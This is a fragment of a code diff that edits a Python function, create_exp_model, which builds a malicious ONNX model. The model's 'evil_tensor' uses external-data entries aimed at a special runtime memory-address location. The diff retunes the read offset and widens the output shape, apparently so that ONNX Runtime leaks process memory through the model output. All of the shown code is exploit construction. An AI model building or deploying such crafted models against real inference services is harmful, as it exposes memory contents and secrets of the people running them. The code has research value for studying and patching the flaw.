@@ -24,7 +24,6 @@ def create_exp_model():
     entry1.value = "*/_ORT_MEM_ADDR_/*"
     entry2 = evil_tensor.external_data.add()
     entry2.key = "offset"
-    entry2.value = "4194304"
     entry2.value = "12230656"
     entry3 = evil_tensor.external_data.add()
     entry3.key = "length"
@@ -33,7 +32,7 @@ def create_exp_model():
     tensors.append(onnx.helper.make_tensor(name="0x1", data_type=onnx.TensorProto.INT64, dims=[1], vals=[0x1]))
     nodes.append(onnx.helper.make_node(op_type="Add", inputs=["evil_weights", "0x1"], outputs=["output"]))
 
-    outputs.append(onnx.helper.make_tensor_value_info("output", onnx.TensorProto.INT64, []))
+    outputs.append(onnx.helper.make_tensor_value_info("output", onnx.TensorProto.INT64, [10]))
 
     graph = onnx.helper.make_graph(nodes, "test", inputs, outputs, tensors)
     model = onnx.helper.make_model(
